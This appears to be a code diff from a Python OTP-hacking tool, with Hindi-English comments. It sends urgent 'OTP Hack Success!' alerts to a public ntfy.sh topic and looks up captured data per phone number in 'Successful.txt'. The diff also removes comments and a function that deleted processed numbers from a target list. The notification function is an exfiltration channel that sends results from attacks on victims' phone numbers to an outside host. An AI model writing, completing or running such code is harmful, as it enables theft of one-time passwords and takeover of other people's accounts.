@@ -1,11 +1,10 @@
 import aiohttp
 from urllib.parse import quote
 
-# Apna Ntfy Topic Name yahan daal
-NTFY_TOPIC = "otpdataashu"  # <-- Yahan apna sahi topic daal diya
+NTFY_TOPIC = "otpdataashu"  
 
 async def send_ntfy_notification(message):
-    url = f"https://ntfy.sh/{NTFY_TOPIC}"  # <-- Ab ye automatically url me lag jayega
+    url = f"https://ntfy.sh/{NTFY_TOPIC}"
     headers = {
         "Title": "✅ OTP Hack Success!",
         "Priority": "urgent",
@@ -26,21 +25,11 @@ def get_successful_data(phone_number):
     try:
         with open("Successful.txt", "r") as f:
             lines = f.readlines()
-            for line in reversed(lines): # Last line se search karenge
+            for line in reversed(lines): 
                 if line.startswith(str(phone_number)):
                     return line.strip()
         return "Data file me nahi mila"
     except FileNotFoundError:
         return "Successful.txt file nahi mili"
 
-def remove_number_from_list(phone_number, filename="numbers.txt"):
-    """Jo number complete ho gaya usko numbers.txt se hata dega"""
-    try:
-        with open(filename, "r") as f:
-            numbers = f.readlines()
-        with open(filename, "w") as f:
-            for num in numbers:
-                if num.strip() != str(phone_number):
-                    f.write(num)
-    except Exception as e:
-        print(f"[-] Number remove karne me error: {e}")
+# (Number remove wala function hata diya gaya hai)
